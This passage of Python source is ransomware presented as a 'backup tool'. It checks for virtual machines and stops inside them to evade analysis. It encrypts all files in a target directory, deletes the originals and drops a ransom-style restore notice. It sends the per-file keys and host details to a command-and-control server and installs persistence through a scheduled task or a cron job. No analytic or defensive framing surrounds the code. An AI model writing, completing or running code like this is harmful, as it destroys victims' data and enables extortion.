    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )


def exponential_backoff(attempt):
    return BACKOFF_BASE ** attempt


def detect_virtual_machine():
    try:
        if os.name == 'nt':
            output = subprocess.check_output("wmic baseboard get manufacturer", shell=True, text=True)
            if "VMware" in output or "VirtualBox" in output:
                return True
        elif os.name == 'posix':
            output = subprocess.check_output("systemd-detect-virt", text=True).strip()
            if output in ['qemu', 'kvm', 'vmware', 'virtualbox', 'xen', 'microsoft']:
                return True
    except Exception as e:
        logging.error(f"Error during VM detection: {e}")
    return False


def generate_encryption_key(file_path):
    hash_obj = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            while chunk := f.read(4096):
                hash_obj.update(chunk)
        return hash_obj.digest()
    except Exception as e:
        logging.error(f"Error generating encryption key for {file_path}: {e}")
        return None


def xor_encrypt_decrypt(file_path, key, output_path):
    try:
        with open(file_path, 'rb') as f_in, open(output_path, 'wb') as f_out:
            file_data = f_in.read()
            encrypted_data = bytes(b ^ key[i % len(key)] for i, b in enumerate(file_data))
            f_out.write(encrypted_data)
    except Exception as e:
        logging.error(f"Error processing file {file_path}: {e}")


def encrypt_files_in_directory(directory):
    os.makedirs(directory, exist_ok=True)
    files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f)) and not f.endswith('.enc')]

    keys = {}
    for file in files:
        file_path = os.path.join(directory, file)
        key = generate_encryption_key(file_path)
        if key:
            encrypted_file_path = f"{file_path}.enc"
            xor_encrypt_decrypt(file_path, key, encrypted_file_path)
            keys[file] = key.hex()
            os.remove(file_path)
            logging.info(f"Encrypted: {file} -> {encrypted_file_path}")
        else:
            logging.error(f"Skipping encryption for {file} due to key generation failure.")
    return keys


def create_restore_notice(directory, note_content):
    os.makedirs(directory, exist_ok=True)
    enc_files = [f for f in os.listdir(directory) if f.endswith('.enc')]

    try:
        with open(RESTORE_NOTICE_FILE, 'w') as f:
            f.write(note_content.format(directory=directory, file_count=len(enc_files)))
        logging.info(f"{RESTORE_NOTICE_FILE} has been created.")
    except Exception as e:
        logging.error(f"Error creating {RESTORE_NOTICE_FILE}: {e}")


def register_metadata_with_server(metadata, server_host, server_port, retry_limit):
    for attempt in range(retry_limit):
        try:
            with socket.create_connection((server_host, server_port)) as s:
                s.sendall(json.dumps(metadata).encode('utf-8'))
                logging.info("Metadata successfully sent to the server.")
                return
        except Exception as e:
            logging.error(f"Error sending metadata to server: {e}")
            time.sleep(exponential_backoff(attempt))
    logging.error("Failed to send metadata to server after multiple retries.")


def ensure_persistence():
    if os.name == 'nt':
        try:
            script_content = f"""\
@echo off
cd /d {os.getcwd()}
python {os.path.basename(sys.argv[0])}
"""
            with open(PERSISTENCE_SCRIPT, 'w') as f:
                f.write(script_content)
            subprocess.call(['schtasks', '/create', '/sc', 'onlogon', '/tn', 'BackupToolPersistence', '/tr', PERSISTENCE_SCRIPT])
            logging.info("Scheduled task created for persistence.")
        except Exception as e:
            logging.error(f"Error creating persistence mechanism: {e}")
    elif os.name == 'posix':
        try:
            cron_command = f"@reboot python3 {os.path.abspath(sys.argv[0])}"
            cron_job = f"(crontab -l 2>/dev/null; echo \"{cron_command}\") | crontab -"
            subprocess.call(cron_job, shell=True)
            logging.info("Cron job created for persistence.")
        except Exception as e:
            logging.error(f"Error creating persistence mechanism: {e}")


def main():
    setup_logging()
    logging.info("Starting the backup tool.")

    if detect_virtual_machine():
        logging.info("Execution halted: Detected running in a virtual machine.")
        return

    encryption_note = (
        "=== RESTORE NOTICE ===\n\n"
        "Your files have been encrypted. To recover your files, please follow the instructions.\n"
        "Contact support and provide the following information:\n"
        "- Directory: {directory}\n"
        "- Encrypted File Count: {file_count}\n"
        )

    logging.info("Encrypting files in the target directory...")
    encryption_keys = encrypt_files_in_directory(TARGET_DIRECTORY)

    logging.info("Creating restore notice...")
    create_restore_notice(TARGET_DIRECTORY, encryption_note)

    logging.info("Registering encryption keys with the command and control server...")
    metadata = {
        "encrypted_files_count": len(encryption_keys),
        "encryption_keys": encryption_keys,
        "environment_properties": {
            "os_name": os.name,
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "architecture": platform.architecture()
        }
    }
    register_metadata_with_server(metadata, DEFAULT_SERVER_HOST, DEFAULT_SERVER_PORT, RETRY_LIMIT)

    logging.info("Ensuring persistence...")
    ensure_persistence()

    logging.info("Backup tool execution completed successfully.")


if __name__ == "__main__":
    main()

